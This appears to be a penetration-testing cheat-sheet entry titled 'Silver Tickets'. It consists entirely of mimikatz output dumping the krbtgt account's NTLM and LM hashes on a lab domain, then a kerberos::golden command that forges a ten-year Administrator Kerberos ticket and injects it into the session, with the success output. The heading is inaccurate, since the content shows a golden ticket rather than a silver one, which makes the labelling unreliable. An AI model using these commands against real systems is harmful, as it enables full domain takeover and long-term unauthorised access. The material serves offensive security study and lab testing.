
#Silver Tickets

```
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 22/03/2018 14:49:02
Object Security ID   : S-1-5-21-1516486103-3973840447-1748718438-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9063b8edb3d04ed734edd49e5b0adef3
    ntlm- 0: 9063b8edb3d04ed734edd49e5b0adef3
    lm  - 0: be97fc24cf1ad2cc2d193430d113f45c
    
mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /rc4:9063b8edb3d04ed734edd49e5b0adef3 /ptt
User      : Administrator
Domain    : testlab.local (TESTLAB)
SID       : S-1-5-21-1516486103-3973840447-1748718438
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9063b8edb3d04ed734edd49e5b0adef3 - rc4_hmac_nt
Lifetime  : 22/03/2018 15:36:25 ; 19/03/2028 15:36:25 ; 19/03/2028 15:36:25
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ testlab.local' successfully submitted for current session    
    
```
